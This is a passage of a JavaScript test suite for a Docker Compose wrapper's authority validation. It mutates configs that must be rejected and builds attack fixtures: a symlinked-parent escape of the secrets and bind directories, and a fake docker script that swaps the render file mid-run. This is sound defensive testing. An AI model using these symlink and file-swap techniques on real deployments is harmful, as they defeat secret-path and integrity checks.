      ["expose", /postgres/i, (config) => { config.services.postgres.expose = [65_535]; }],
      ["cpus", /postgres/i, (config) => { config.services.postgres.cpus = 999; }],
      ["cpu_shares", /postgres/i, (config) => { config.services.postgres.cpu_shares = 262_144; }],
      ["memory tuple", /postgres/i, (config) => {
        config.services.postgres.mem_limit = 512 * 1024 * 1024;
        config.services.postgres.mem_reservation = 511 * 1024 * 1024;
        config.services.postgres.memswap_limit = 512 * 1024 * 1024;
      }],
      ["blkio", /postgres/i, (config) => {
        config.services.postgres.blkio_config = { weight: 1000 };
      }],
      ["ulimit", /postgres/i, (config) => {
        config.services.postgres.ulimits = { nofile: { soft: 65_536, hard: 65_536 } };
      }],
      ["numeric user", /postgres/i, (config) => { config.services.postgres.user = "1:1"; }],
      ["cap_drop presence", /postgres/i, (config) => {
        config.services.postgres.cap_drop = ["ALL"];
      }],
      ["volume labels", /volume.*enterprise_postgres_data/i, (config) => {
        config.volumes.enterprise_postgres_data.labels = { "qa8.attacker": "true" };
      }],
      ["network options", /network.*platform_postgres/i, (config) => {
        Object.assign(config.networks.platform_postgres, {
          driver: "bridge",
          attachable: false,
          enable_ipv4: true,
          enable_ipv6: false,
        });
      }],
      ["unknown document field", /(?:document|top|field|config)/i, (config) => {
        config["x-qa8-attacker"] = {};
      }],
    ];
    const accepted = [];
    for (const [label, violationPattern, mutate] of mutations) {
      const config = structuredClone(baseline.config);
      mutate(config);
      const violations = validateNoHostedCoreAuthority(
        lock,
        config,
        sandbox.root,
        environment,
      );
      if (!violations.some((violation) => violationPattern.test(violation))) {
        accepted.push(label);
      }
    }
    assert.deepEqual(accepted, [], `semantic authority drift was accepted: ${accepted.join(", ")}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA8 secret and root bind ancestry cannot escape through a symlinked parent", () => {
  const outcomes = [];
  for (const mode of ["secret", "bind"]) {
    const sandbox = createConsumerSandbox();
    try {
      const environment = installQa8Environment(sandbox);
      const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
      const config = selectQa8AcceptedBaseline(sandbox, lock, environment).config;
      materializeQa8CanonicalSources(sandbox, config);
      const bytes = `${JSON.stringify(config)}\n`;
      writeDockerOutput(sandbox, bytes);
      const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(baseline.status, 0, baseline.stderr);
      assert.equal(baseline.stdout, bytes, `${mode} baseline bytes changed`);
      fs.rmSync(sandbox.dockerMarker, { force: true });
      const outside = path.join(sandbox.cleanupRoot, `outside-${mode}`);
      if (mode === "secret") {
        fs.renameSync(path.join(sandbox.root, "secrets"), outside);
        fs.symlinkSync(outside, path.join(sandbox.root, "secrets"), "dir");
      } else {
        fs.renameSync(path.join(sandbox.root, "alertmanager"), outside);
        fs.symlinkSync(outside, path.join(sandbox.root, "alertmanager"), "dir");
        assert.equal(
          config.services.alertmanager.volumes.some((mount) =>
            mount.source === path.join(sandbox.root, "alertmanager", "alertmanager.yml")),
          true,
          "bind escape fixture does not use the lexical root path",
        );
      }
      const escapedLeaf = mode === "secret"
        ? config.secrets.control_center_database_url.file
        : path.join(sandbox.root, "alertmanager", "alertmanager.yml");
      assert.equal(
        fs.realpathSync.native(escapedLeaf).startsWith(`${sandbox.root}${path.sep}`),
        false,
        `${mode} parent symlink did not escape the canonical root`,
      );
      const result = runWrapper(sandbox, ["config", "--format", "json"]);
      if (result.status !== 0) {
        assert.equal(result.stdout, "", `${mode} authority failure leaked rendered bytes`);
        assert.match(
          result.stderr,
          /(?:secret|bind|path|symlink|authority)/i,
          `${mode} escape failed for an unrelated reason:\n${result.stderr}`,
        );
      }
      outcomes.push({
        mode,
        status: result.status,
        stdoutBytes: result.stdout.length,
      });
    } finally {
      removeSandbox(sandbox);
    }
  }
  assert.deepEqual(
    outcomes,
    [
      { mode: "secret", status: 1, stdoutBytes: 0 },
      { mode: "bind", status: 1, stdoutBytes: 0 },
    ],
    `symlink ancestry escaped core authority: ${JSON.stringify(outcomes)}`,
  );
});

test("QA8 Compose render bytes use pre-bound FDs after unlinking the renderer pathname", () => {
  const sandbox = createConsumerSandbox();
  try {
    const environment = installQa8Environment(sandbox);
    const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    const config = selectQa8AcceptedBaseline(sandbox, lock, environment).config;
    materializeQa8CanonicalSources(sandbox, config);
    const originalBytes = `${JSON.stringify(config)}\n`;
    const replacementBytes = `${JSON.stringify(config, null, 2)}\n`;
    writeDockerOutput(sandbox, originalBytes);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(baseline.stdout, originalBytes, "baseline wrapper changed renderer bytes");
    fs.writeFileSync(path.join(sandbox.root, "docker-replacement.json"), replacementBytes, {
      mode: 0o600,
    });
    fs.writeFileSync(path.join(sandbox.root, "docker-render-count"), "0\n", { mode: 0o600 });
    writeExecutable(path.join(sandbox.root, "bin", "docker"), `#!/bin/sh
set -eu
sandbox_root=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
: > "$sandbox_root/render-attempted"
count=0
IFS= read -r count < "$sandbox_root/docker-render-count"
count=$((count + 1))
printf '%s\\n' "$count" > "$sandbox_root/docker-render-count"
/bin/cat "$sandbox_root/docker-output.json"
for candidate in "$sandbox_root"/hosted-compose-handoff.*/compose-render-*; do
  [ -e "$candidate" ] || continue
  /bin/mv "$candidate" "$candidate.original"
  /bin/rm "$candidate.original"
  /bin/cat "$sandbox_root/docker-replacement.json" > "$candidate"
  : > "$sandbox_root/render-path-swap-fired"
  break
done
`);
    const result = runWrapper(
      sandbox,
      ["config", "--format", "json"],
      { TMPDIR: sandbox.root },
    );
    assert.equal(
      fs.existsSync(path.join(sandbox.root, "render-attempted")),
      true,
      "renderer attempt marker did not fire",
    );
    assert.equal(
      fs.readFileSync(path.join(sandbox.root, "docker-render-count"), "utf8").trim(),
      "1",
      "wrapper rendered more than once",
    );
    assert.equal(
      fs.existsSync(path.join(sandbox.root, "render-path-swap-fired")),
      false,
      "renderer observed a handoff pathname that should already be unlinked",
    );
    assert.equal(result.status, 0, result.stderr);
    assert.equal(result.stdout, originalBytes, "wrapper did not consume the pre-bound render FD");
    assert.notEqual(result.stdout, replacementBytes, "replacement pathname became validated authority");
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA8 no-hosted mode rejects a complete runtime identity tuple instead of ignoring it", () => {
  const sandbox = createConsumerSandbox();
  try {
    const environment = installQa8Environment(sandbox);
    const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    const config = selectQa8AcceptedBaseline(sandbox, lock, environment).config;
    materializeQa8CanonicalSources(sandbox, config);
    const bytes = `${JSON.stringify(config)}\n`;
    writeDockerOutput(sandbox, bytes);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(baseline.stdout, bytes, "runtime tuple baseline changed renderer bytes");
    fs.rmSync(sandbox.dockerMarker, { force: true });
    const result = runWrapper(sandbox, ["config", "--format", "json"], {
      PLATFORM_RUNTIME_CANDIDATE_ID: "a".repeat(64),
      PLATFORM_RUNTIME_COMMIT: "b".repeat(40),
      PLATFORM_RUNTIME_TREE: "c".repeat(40),
      PLATFORM_RUNTIME_DEPLOYMENT_ID: "deploy-qa8-20260728",
      PLATFORM_RUNTIME_SOURCE_RENDER_SHA256: "d".repeat(64),
      PLATFORM_RUNTIME_WORKLOAD_LOCK_SHA256: "e".repeat(64),
    });
    assert.notEqual(result.status, 0, "no-hosted silently ignored a complete runtime identity tuple");
    assert.equal(fs.existsSync(sandbox.dockerMarker), false, "ignored runtime identity reached renderer");
    assert.match(
      result.stderr,
      /(?:no-hosted.*runtime identity|runtime identity.*no-hosted)/i,
      `runtime tuple failed before renderer for an unrelated reason:\n${result.stderr}`,
    );
  } finally {
    removeSandbox(sandbox);
  }
});
